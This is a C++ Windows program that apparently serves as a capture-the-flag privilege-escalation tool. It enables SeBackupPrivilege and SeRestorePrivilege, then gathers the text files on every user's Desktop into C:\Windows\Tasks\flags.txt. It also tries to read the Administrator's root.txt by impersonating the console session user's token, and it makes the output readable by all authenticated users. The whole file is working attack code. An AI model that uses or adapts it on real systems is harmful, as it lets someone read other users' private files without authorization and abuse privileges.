#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <filesystem>
#include <Windows.h>
#include <Aclapi.h>
#include <Lmcons.h>
#include <chrono>
#include <iomanip>
#include <Wtsapi32.h>

#pragma comment(lib, "Wtsapi32.lib")

namespace fs = std::filesystem;

std::string convert_wstring_to_string(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &str[0], size_needed, NULL, NULL);
    return str;
}

std::wstring convert_string_to_wstring(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstr[0], size_needed);
    return wstr;
}

std::wstring get_current_time() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);
    std::wstringstream ss;
    tm bt{};
    localtime_s(&bt, &in_time_t);
    ss << std::put_time(&bt, L"%Y-%m-%d %X");
    return ss.str();
}

std::wstring get_username() {
    wchar_t username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameW(username, &username_len)) {
        return std::wstring(username);
    }
    else {
        return L"Unknown User";
    }
}

void concatenate_txt_files(const fs::path& directory, std::wofstream& output) {
    for (const auto& entry : fs::directory_iterator(directory)) {
        if (entry.path().extension() == L".txt") {
            std::wifstream input(entry.path(), std::ios::binary);
            if (input.is_open()) {
                output << L"=====================================\n";
                output << L"File: " << entry.path().wstring() << L"\n";
                output << L"Timestamp: " << get_current_time() << L"\n";
                output << L"=====================================\n";
                output << input.rdbuf();
                output << L"\n\n";
                input.close();
            }
            else {
                DWORD errorCode = GetLastError();
                LPVOID errorMessage;
                FormatMessageW(
                    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL,
                    errorCode,
                    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                    (LPWSTR)&errorMessage,
                    0, NULL);
                std::wstring werr_msg((wchar_t*)errorMessage);
                std::wstring err_msg = convert_string_to_wstring(convert_wstring_to_string(werr_msg));
                output << L"=====================================\n";
                output << L"Error: Could not open file: " << entry.path().wstring() << L"\n";
                output << L"Error Code: " << errorCode << L" - " << err_msg << L"\n";
                output << L"Timestamp: " << get_current_time() << L"\n";
                output << L"=====================================\n\n";
                LocalFree(errorMessage);
            }
        }
    }
}

bool impersonate_user_by_name(const std::wstring& username) {
    HANDLE token;
    DWORD session_id = WTSGetActiveConsoleSessionId();
    if (WTSQueryUserToken(session_id, &token)) {
        if (ImpersonateLoggedOnUser(token)) {
            CloseHandle(token);
            return true;
        }
        CloseHandle(token);
    }
    return false;
}

void revert_to_self() {
    RevertToSelf();
}

void set_file_permissions(const std::wstring& file_path) {
    PACL pOldDACL = nullptr, pNewDACL = nullptr;
    PSECURITY_DESCRIPTOR pSD = nullptr;
    EXPLICIT_ACCESSW ea;

    // Get a pointer to the existing DACL.
    if (GetNamedSecurityInfoW(file_path.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
        nullptr, nullptr, &pOldDACL, nullptr, &pSD) == ERROR_SUCCESS) {

        // Initialize an EXPLICIT_ACCESS structure for the new ACE.
        ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
        ea.grfAccessPermissions = GENERIC_READ;
        ea.grfAccessMode = SET_ACCESS;
        ea.grfInheritance = NO_INHERITANCE;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
        PSID pSIDAuthenticatedUsers = nullptr;

        // Create a SID for the Authenticated Users group.
        if (AllocateAndInitializeSid(&SIDAuthNT, 1,
            SECURITY_AUTHENTICATED_USER_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pSIDAuthenticatedUsers)) {

            ea.Trustee.ptstrName = static_cast<LPWSTR>(pSIDAuthenticatedUsers);

            // Create a new ACL that merges the new ACE into the existing DACL.
            if (SetEntriesInAclW(1, &ea, pOldDACL, &pNewDACL) == ERROR_SUCCESS) {
                // Attach the new ACL as the object's DACL.
                SetNamedSecurityInfoW(const_cast<LPWSTR>(file_path.c_str()), SE_FILE_OBJECT,
                    DACL_SECURITY_INFORMATION, nullptr, nullptr, pNewDACL, nullptr);
                LocalFree(pNewDACL);
            }
            FreeSid(pSIDAuthenticatedUsers);
        }
        LocalFree(pSD);
    }
}

bool enable_privilege(LPCTSTR privilege) {
    TOKEN_PRIVILEGES tp;
    HANDLE token;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        return false;
    }

    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        CloseHandle(token);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(token);
        return false;
    }

    CloseHandle(token);
    return GetLastError() == ERROR_SUCCESS;
}

bool enable_all_privileges() {
    return enable_privilege(SE_BACKUP_NAME) && enable_privilege(SE_RESTORE_NAME);
}

int wmain() {
    try {
        if (!enable_all_privileges()) {
            std::wcerr << L"Error: Could not enable necessary privileges." << std::endl;
            return 1;
        }

        std::wstring output_file = L"C:\\Windows\\Tasks\\flags.txt";
        std::wofstream output(output_file, std::ios::out | std::ios::trunc);
        if (!output.is_open()) {
            std::wcerr << L"Error: Could not open output file." << std::endl;
            return 1;
        }

        // Write header information to the log file
        output << L"=====================================\n";
        output << L"Log created on: " << get_current_time() << L"\n";
        output << L"Executed by: " << get_username() << L"\n";
        output << L"Privileges: SeBackupPrivilege, SeRestorePrivilege\n";
        output << L"=====================================\n\n";

        fs::path users_directory(L"C:\\Users");
        for (const auto& user : fs::directory_iterator(users_directory)) {
            try {
                fs::path desktop_directory = user.path() / L"Desktop";
                if (fs::exists(desktop_directory) && fs::is_directory(desktop_directory)) {
                    concatenate_txt_files(desktop_directory, output);
                }
            }
            catch (const fs::filesystem_error& e) {
                // Ignore access denied errors
                if (e.code() != std::errc::permission_denied) {
                    std::wcerr << L"Exception: " << e.what() << std::endl;
                }
                else {
                    output << L"=====================================\n";
                    output << L"Error: Access denied to " << user.path().wstring() << L"\n";
                    output << L"Timestamp: " << get_current_time() << L"\n";
                    output << L"=====================================\n\n";
                }
            }
        }

        // Attempt to access the specific file with user impersonation
        fs::path root_txt_path(L"C:\\Users\\Administrator\\Desktop\\root.txt");
        if (impersonate_user_by_name(L"Administrator")) {
            std::wifstream input(root_txt_path, std::ios::binary);
            if (input.is_open()) {
                output << L"=====================================\n";
                output << L"File: " << root_txt_path.wstring() << L"\n";
                output << L"Timestamp: " << get_current_time() << L"\n";
                output << L"=====================================\n";
                output << input.rdbuf();
                output << L"\n\n";
                input.close();
            }
            else {
                DWORD errorCode = GetLastError();
                LPVOID errorMessage;
                FormatMessageW(
                    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL,
                    errorCode,
                    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                    (LPWSTR)&errorMessage,
                    0, NULL);
                std::wstring werr_msg((wchar_t*)errorMessage);
                std::wstring err_msg = convert_string_to_wstring(convert_wstring_to_string(werr_msg));
                output << L"=====================================\n";
                output << L"Error: Could not open file: " << root_txt_path.wstring() << L"\n";
                output << L"Error Code: " << errorCode << L" - " << err_msg << L"\n";
                output << L"Timestamp: " << get_current_time() << L"\n";
                output << L"=====================================\n\n";
                LocalFree(errorMessage);
            }
            revert_to_self();
        }
        else {
            output << L"=====================================\n";
            output << L"Error: Could not impersonate user: Administrator\n";
            output << L"Timestamp: " << get_current_time() << L"\n";
            output << L"=====================================\n\n";
        }

        output.close();
        set_file_permissions(output_file);
    }
    catch (const std::exception& e) {
        std::wcerr << L"Exception: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
